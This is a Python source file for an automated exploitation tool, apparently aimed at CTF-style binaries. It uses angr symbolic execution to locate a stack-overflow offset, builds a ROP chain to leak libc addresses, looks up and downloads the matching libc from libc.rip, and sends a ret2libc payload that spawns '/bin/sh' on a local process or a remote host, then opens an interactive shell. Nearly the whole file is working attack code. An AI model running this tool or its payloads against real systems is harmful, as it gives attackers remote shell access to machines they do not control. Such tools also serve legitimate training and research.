import angr
from angr import sim_options as so
import claripy
import timeout_decorator
from pwn import *
import requests
from bs4 import BeautifulSoup
import os
import shutil
from utils.database import Database
import re
import json

class Exploit(Database):
	def __init__(self, dict):
		"""
		It takes a dictionary as an argument, and then it initializes the class with the values of the
		dictionary
		
		:param dict: A dictionary containing the following keys:
		"""
		self.ip = dict.get("ip")
		self.port = dict.get("port")
		self.is_printable= dict.get("is_printable")
		self.binary_name = dict.get("binary")
		self.elf = ELF(dict.get("binary"))
		self.offset_leaking = self.elf.process()
		self.rop = ROP(self.elf)
		self.url_libc = "https://libc.rip/"
		Database.__init__(self, dict.get("binary"), self.elf.aslr)
		if not self.pwn_state:
			self.add_basics()
		if self.ip is not None and self.port is not None:
			try:
				self.p = remote(self.ip,self.port)
			except Exception as e:
				log.warning("Couldn't connect... Aborting.")
				log.warning(e)
				exit(-1)
		else:
			self.p = self.elf.process()
		context.arch = dict.get("arch") or "amd64"

	def recovery(self, instance, message, *args, exception=Exception, callback=lambda: None):
		"""
		If the instance's call method fails, log a warning and then call the callback function
		
		:param instance: The instance of the class that is being called
		:param message: The message to log when the exception is raised
		:param exception: The exception to catch
		:param callback: A function that will be called if the callable raises an exception
		"""
		try:
			instance.call(*args)
		except exception:
			log.warning(message)
			callback()

	def overflow_detect_filter(self, simgr):
		"""
		If the program is in a state where it is not constrained, and the PC is pointing to the bytes
		"CCCC", then constrain the input to be printable and add the state to the found stash
		
		:param simgr: the simulation manager
		:return: the state of the program after the first successful run.
		"""
		for state in simgr.unconstrained:
			bits = state.arch.bits
			num_count = bits / 8
			pc_value = b"C" * int(num_count)
			if state.solver.satisfiable(extra_constraints=[state.regs.pc == pc_value]):
				state.add_constraints(state.regs.pc == pc_value)
				user_input = state.globals["user_input"]
				log.info("Found vulnerable state.")
				if self.is_printable:
					log.info("Constraining input to be printable")
					for c in user_input.chop(8):
						constraint = claripy.And(c > 0x2F, c < 0x7F)
						if state.solver.satisfiable([constraint]):
							state.add_constraints(constraint)

				input_bytes = state.solver.eval(user_input, cast_to=bytes)
				log.info("[+] Vulnerable path found {}".format(input_bytes))
				if b"CCCC" in input_bytes:
					log.info("[+] Offset to bytes : {}".format(input_bytes.index(b"CCCC")))
				state.globals["offset"] = input_bytes.index(b"CCCC")
				state.globals["input"] = input_bytes
				simgr.stashes["found"].append(state)
				simgr.stashes["unconstrained"].remove(state)
				break
		return simgr

	def checkOverflow(self, binary_name, inputType="STDIN"):
		"""
		It checks if the binary is triggerable with the given input.
		
		:param binary_name: The name of the binary to be analyzed
		:param inputType: , defaults to STDIN (optional)
		:return: a dictionary with the following keys:
		- offset: The offset at which the overflow occurs
		- input: The input that triggers the overflow
		- inputType: The input type (STDIN or LIBPWNABLE)
		"""
		extras = {
			so.REVERSE_MEMORY_NAME_MAP,
			so.TRACK_ACTION_HISTORY,
			so.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
			so.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
		}

		class hookFour(angr.SimProcedure):
			IS_FUNCTION = True

			def run(self):
				return 4  

		p = angr.Project(binary_name, load_options={"auto_load_libs": False})
		p.hook_symbol("rand", hookFour)
		p.hook_symbol("srand", hookFour)

		argv = [binary_name]
		input_arg = claripy.BVS("input", 300 * 8)
		if inputType == "STDIN":
			state = p.factory.full_init_state(args=argv, stdin=input_arg)
			state.globals["user_input"] = input_arg
		elif inputType == "LIBPWNABLE":
			handle_connection = p.loader.main_object.get_symbol("handle_connection")
			state = p.factory.entry_state(
				addr=handle_connection.rebased_addr, stdin=input_arg, add_options=extras
			)
			state.globals["user_input"] = input_arg
		else:
			argv.append(input_arg)
			state = p.factory.full_init_state(args=argv)
			state.globals["user_input"] = input_arg

		state.libc.buf_symbolic_bytes = 0x100
		state.globals["inputType"] = inputType
		simgr = p.factory.simgr(state, save_unconstrained=True)

		run_environ = {}
		run_environ["offset"] = None
		end_state = None
		try:
			@timeout_decorator.timeout(120)
			def exploreBinary(simgr):
				simgr.explore(
					find=lambda s: "offset" in s.globals, step_func=self.overflow_detect_filter
				)
			exploreBinary(simgr)
			if "found" in simgr.stashes and len(simgr.found):
				end_state = simgr.found[0]
				run_environ["offset"] = end_state.globals["offset"]
		except (KeyboardInterrupt, timeout_decorator.TimeoutError) as e:
			log.info("[~] Keyboard Interrupt")
		if "input" in run_environ.keys():
			run_environ["input"] = end_state.globals["input"]
			log.info("[+] Triggerable with input : {}".format(end_state.globals["input"]))
		return run_environ

	def payload_generator(self, instance, offset):
		"""
		It takes an instance of a ROP class and an offset, and returns a payload that is aligned to 16 bytes.
		
		:param instance: The ROP chain you want to use (to leak, or to get a shell)
		:param offset: The offset to the return address
		:return: The return value is a string of bytes that is the payload that will be sent to the server.
		"""
		payload = [
			b"A"*offset,
			instance.chain()
		]
		payload = b"".join(payload)
		if instance == self.rop:
			if len(payload) % 16 != 0:
				log.info("Payload not aligned... Aligning it.")
				rop2 = ROP(self.elf)
				available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
				for func in available_funcs:
					self.recovery(rop2,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
				self.recovery(rop2, "Couldn't find ret", rop2.find_gadget(["ret"])[0])
				self.recovery(rop2,f"No main found...", self.elf.symbols["main"])
				payload2 = [
					b"A"*offset,
					rop2.chain()
				]
				payload2 = b"".join(payload2)
				return payload2
			else: return payload
		else:
			if len(payload) % 16 != 0:
				self.recovery(self.roplibc, "Couldn't find ret", self.roplibc.find_gadget(["ret"]))
				self.recovery(self.roplibc, "Didn't found system...","system",[ next(self.libc.search(b"/bin/sh\x00")) ])
				self.recovery(self.roplibc,"Didn't found exit...","exit")
				payload2 = [
					b"A"*offset,
					self.roplibc.chain()
				]
				payload2 = b"".join(payload2)
				return payload2
			else: return payload


	def join_cwd(self, path):
		"""
		*Join the current working directory with the given path.*
		
		:param path: The path to the file you want to download
		:return: the path to the file.
		"""
		return os.path.join(os.getcwd(), path)

	def main(self):
		overflow_result = self.checkOverflow(self.binary_name)
		offset = overflow_result.get("offset")
		self.add_offset(offset)
		log.info("Leaking available address...")

		available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
		for func in available_funcs:
			self.recovery(self.rop,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
		self.recovery(self.rop,f"No main found...", self.elf.symbols["main"])
		payload1 = self.payload_generator(self.rop,offset)
		self.add_p1(payload1)
		self.p.sendline(payload1)

		leaked_addr_list, leaked_list = [], []
		output = self.p.recv().split(b'\n')
		for resp in output:
			if "\\x" in str(resp):
				leaked_list.append(resp)
		i=0
		for name in available_funcs: 
			leaked = u64(leaked_list[i].rstrip().ljust(8, b"\x00"))
			log.info(f"{name} @ {hex(leaked)}")
			leaked_addr_list.append(hex(leaked))
			i+=1
		
		log.info("Looking for a libc...")
		leaked_addr = '{"symbols":{'
		for addr, func in zip(leaked_addr_list, available_funcs):
			jsoned = '"' + func + '":"' + addr + '",'
			leaked_addr += jsoned
		# this needs to follow the following format:
		# {"symbols":{"func":"addr","func":"addr","func":"addr"}}
		json_data = json.loads(leaked_addr[:-1] + "}}")
		page = requests.post(self.url_libc+"api/find",json=json_data)
		libc_found = re.search("(?P<url>https?://[^\\s]+)", page.content.decode('utf-8')).group("url")[:-2]
		log.info("Found a LIBC that could work (found it on https://libc.rip/).")
		log.info("Testing with following LIBC: " + libc_found[26:])
		
		if libc_found != "":
			if (libc_found[26:]) not in os.listdir('./libc/'):
				log.info("Downloading libc... Could take some time depending of your internet")
				req = requests.get(libc_found, allow_redirects=True)
				open("./libc/"+libc_found[26:],'wb').write(req.content)
				LIBC = "./libc/" + str(libc_found[26:])
				self.add_libc(LIBC)
			else:
				log.info('LIBC already downloaded previously')
				LIBC = "./libc/" + str(libc_found[26:])
				self.add_libc(LIBC)
			if LIBC:
				self.libc = ELF(LIBC) 
				self.libc.address = leaked - self.libc.symbols[available_funcs[-1]]
				log.info(f"base libc @ {hex(self.libc.address)}")
		else:
			log.warning("Couldn't find LIBC... Aborting.")
			exit(-1)

		self.roplibc = ROP(self.libc)
		self.recovery(self.roplibc, "Didn't find system...","system",[ next(self.libc.search(b"/bin/sh\x00")) ])
		self.recovery(self.roplibc,"Didn't find exit...","exit")

		payload2 = self.payload_generator(self.roplibc, offset)

		self.add_p2(payload2)
		self.p.sendline(payload2)
		self.p.sendline(b'echo pwned')
		if self.p.recvline() == b'pwned\n':
			log.info("Enjoy that sweet shell!")
			self.p.interactive()
		else: 
			log.info("Looks like ret2libc didn't work...")